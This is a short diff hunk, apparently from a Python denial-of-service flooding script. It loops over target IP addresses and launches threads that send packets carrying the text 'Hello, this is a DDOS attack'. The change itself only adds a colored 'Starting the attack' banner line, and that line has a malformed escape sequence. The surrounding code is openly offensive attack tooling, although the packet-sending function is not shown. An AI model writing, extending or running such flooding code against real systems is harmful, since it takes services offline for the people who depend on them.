@@ -86,6 +86,7 @@ for ip in ips:
         # Use a bytes literal to create the data
         data = b'Hello, this is a DDOS attack'
         print("Starting the attack on ", ip, " at port ", port, " with a times ", time, "...")
+        print("[✴️]  \033[32mRiri  \033[34m" +str(u)+ " \033(33m Starting the attack on \033[94m" +ip+ " \033[0m")
         for i in range(threads):
             t = threading.Thread(target=send_packets, args=(ip, int(port), data, proxy_size))
             t.start()           
